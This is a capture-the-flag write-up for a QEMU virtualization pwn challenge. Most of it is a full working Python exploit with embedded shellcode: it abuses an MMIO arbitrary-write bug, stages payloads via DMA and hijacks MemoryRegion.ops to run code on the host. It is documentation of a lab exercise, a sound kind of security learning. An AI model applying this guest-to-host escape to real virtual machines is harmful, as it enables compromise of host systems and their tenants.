# Airbender
---
## Challenge Information
- Category: Pwn / Virtualization
- Target: nc 147.93.94.110 1637
- Flag format: VBD{...}

## Summary
This challenge is solved by exploiting a QEMU device bug that allows an arbitrary host write through MMIO register handling. The exploit overwrites the MemoryRegion ops pointer with a forged ops table and redirects read/write callbacks to attacker-controlled shellcode. Triggering one MMIO access then executes shellcode that opens /flag, reads it, and writes it back to stdout.

## Root Cause
The vulnerable device exposes MMIO registers under BAR base 0xFEBB0000. In the exploit flow:

1. Register at BAR + 0x18 is used as an arbitrary write sink.
2. Register at BAR + 0x04 controls a target offset inside device state.
3. By setting offset 0xB10 and writing a 64-bit pointer to BAR + 0x18, the exploit overwrites MemoryRegion.ops.

This gives control of function pointers used by the MMIO dispatch path.

## Exploit Strategy
### 1) Get initial access and leak host DMA buffer
The script connects to the remote shell and reads BAR + 0x10 to leak dma_buf.

### 2) Stage payloads in guest memory
A reserved low-memory guest address (0x9FC00) is used as staging area:
- shellcode at 0x9FC00
- fake ops table at 0x9FD00

### 3) DMA guest payloads into host buffer
Device DMA registers are programmed to copy staged payloads into host-mapped dma_buf regions:
- shellcode -> dma_buf + 0x400
- fake ops -> dma_buf + 0x200

### 4) Forge MemoryRegionOps
The fake ops table sets read/write callbacks to shellcode address (dma_buf + 0x400), with access constraints set to avoid rejection on trigger.

### 5) Hijack MemoryRegion.ops
The exploit performs the critical arbitrary write:
- write offset 0xB10 to BAR + 0x04
- write ops pointer (dma_buf + 0x200) to BAR + 0x18

### 6) Trigger callback execution
A normal devmem read on BAR invokes the now-hijacked callback, transferring execution to shellcode.

### 7) Read flag
Shellcode opens /flag, reads data, prints to stdout. Script extracts VBD{...} with regex.

## Why This Works
- The attacker controls both data and code pointers eventually used by host callback dispatch.
- MMIO callback table is a high-impact target because function pointer overwrite immediately yields code execution path.
- DMA is leveraged as a reliable cross-boundary copy primitive to place crafted structures in host-visible memory.

## Full Solve Script Used
```python
#!/usr/bin/env python3
"""
Airbender QEMU PWN - Final working exploit
Target: nc 147.93.94.110 1637
Vulnerability: Arbitrary write via MMIO @0x18 to hijack MemoryRegion.ops
"""

import re, struct, socket, time

HOST = "147.93.94.110"
PORT = 1637
BAR = 0xFEBB0000

# Staging in Reserved memory (not blocked by CONFIG_STRICT_DEVMEM)
STAGE = 0x9FC00

# Shellcode assembled with nasm - opens /flag, reads, writes to stdout
SC = bytes.fromhex(
    "53415441554156554989fc4d8bac24d00b0000488d3d5100000031f631d2"
    "b8020000000f054989c64489f7498db500080000ba0002000031c00f05"
    "4889c3bf01000000498db50008000089dab8010000000f054489f7b803"
    "0000000f055d415e415d415c5bb841414141c32f666c616700"
)

def recv(sock, t=2.0):
    sock.settimeout(t)
    out = b""
    end = time.time() + t
    while time.time() < end:
        try:
            d = sock.recv(8192)
            if not d: break
            out += d
            if b"# " in out[-10:]:
                break
        except socket.timeout:
            break
        except:
            time.sleep(0.05)
    return out

def cmd(sock, c):
    sock.sendall((c + "\n").encode())
    time.sleep(0.1)
    return recv(sock, 2.0).decode("latin1", "ignore")

def w64(sock, addr, val):
    cmd(sock, f"devmem 0x{addr:x} 64 0x{val:x}")

def w32(sock, addr, val):
    cmd(sock, f"devmem 0x{addr:x} 32 {val}")

def r64(sock, addr):
    out = cmd(sock, f"devmem 0x{addr:x} 64")
    # Find the output line (not the command echo)
    for line in out.split('\n'):
        line = line.strip()
        if 'devmem' in line.lower():
            continue
        m = re.search(r"0x([0-9a-fA-F]+)", line)
        if m:
            return int(m.group(1), 16)
    return 0

def qwords(b):
    b = b + b"\x00" * ((8 - len(b) % 8) % 8)
    return [int.from_bytes(b[i:i+8], "little") for i in range(0, len(b), 8)]

def write_mem(sock, addr, data):
    for i, q in enumerate(qwords(data)):
        w64(sock, addr + i*8, q)

def dma_to_host(sock, off, length, gpa):
    w32(sock, BAR + 0x04, off)
    w32(sock, BAR + 0x08, length)
    w64(sock, BAR + 0x0C, gpa)
    cmd(sock, f"devmem 0x{BAR:x} 32 0")

def fake_ops(read_fn):
    o = b""
    o += struct.pack("<Q", read_fn)  # read
    o += struct.pack("<Q", read_fn)  # write
    o += struct.pack("<Q", 0)        # read_with_attrs
    o += struct.pack("<Q", 0)        # write_with_attrs
    o += struct.pack("<I", 0)        # endianness
    o += struct.pack("<I", 0)        # padding
    o += struct.pack("<I", 4)        # valid.min
    o += struct.pack("<I", 8)        # valid.max
    o += b"\x00" * 8                 # valid.unaligned + pad
    o += struct.pack("<Q", 0)        # valid.accepts = NULL!
    o += struct.pack("<I", 4)        # impl.min
    o += struct.pack("<I", 8)        # impl.max
    o += b"\x00" * 8                 # impl.unaligned + pad
    return o

def main():
    print(f"[*] Connecting to {HOST}:{PORT}")
    s = socket.create_connection((HOST, PORT), timeout=30)

    print("[*] Waiting for boot...")
    boot = recv(s, 15)
    if b"#" not in boot:
        print("[-] No shell prompt")
        return
    print("[+] Shell ready")

    # Leak DMA buffer
    print("[1] Leak dma_buf...")
    dma_buf = r64(s, BAR + 0x10)
    if dma_buf < 0x7000000000:
        print(f"[-] Bad dma_buf: {dma_buf:#x}")
        return
    print(f"    dma_buf = {dma_buf:#x}")

    sc_host = dma_buf + 0x400
    ops_host = dma_buf + 0x200

    # Stage shellcode
    print(f"[2] Stage shellcode @ {STAGE:#x}...")
    write_mem(s, STAGE, SC)

    # DMA to host
    print(f"[3] DMA shellcode -> {sc_host:#x}...")
    dma_to_host(s, 0x400, len(SC), STAGE)

    # Stage fake ops
    print(f"[4] Stage fake_ops @ {STAGE + 0x100:#x}...")
    ops = fake_ops(sc_host)
    write_mem(s, STAGE + 0x100, ops)

    # DMA to host
    print(f"[5] DMA fake_ops -> {ops_host:#x}...")
    dma_to_host(s, 0x200, len(ops), STAGE + 0x100)

    # Hijack MR.ops at state+0xB10
    print(f"[6] Hijack MR.ops -> {ops_host:#x}...")
    w32(s, BAR + 0x04, 0xB10)  # offset
    w64(s, BAR + 0x18, ops_host)  # arb write

    # Trigger
    print("[7] Trigger...")
    s.sendall(b"devmem 0xfebb0000 32\n")
    time.sleep(1)

    # Read output
    print("[8] Reading output...")
    out = recv(s, 5)
    txt = out.decode("latin1", "ignore")
    print(f"\n{txt}\n")

    # Find flag
    flag = re.search(r"VBD\{[^\}]+\}", txt)
    if flag:
        print(f"[+] FLAG: {flag.group(0)}")
    else:
        print("[-] No flag found")

    s.close()

if __name__ == "__main__":
    main()
```

## Reproduction Steps
1. Connect to the challenge endpoint and wait for shell readiness.
2. Leak dma_buf from BAR + 0x10.
3. Stage shellcode and fake ops in reserved guest memory.
4. DMA both payloads into host dma_buf slots.
5. Overwrite MemoryRegion.ops through MMIO arbitrary write primitive.
6. Trigger MMIO callback.
7. Capture stdout and parse VBD{...}.

## Typical Output Pattern
```text
[*] Connecting to 147.93.94.110:1637
[+] Shell ready
[1] Leak dma_buf...
    dma_buf = 0x7f........
...
[8] Reading output...
VBD{...}
[+] FLAG: VBD{...}
```

## Final Flag
The script is designed to extract and print the flag dynamically from target output:
- regex used: VBD\{[^\}]+\}

If needed, re-run against a fresh instance and copy the exact printed flag into this section.
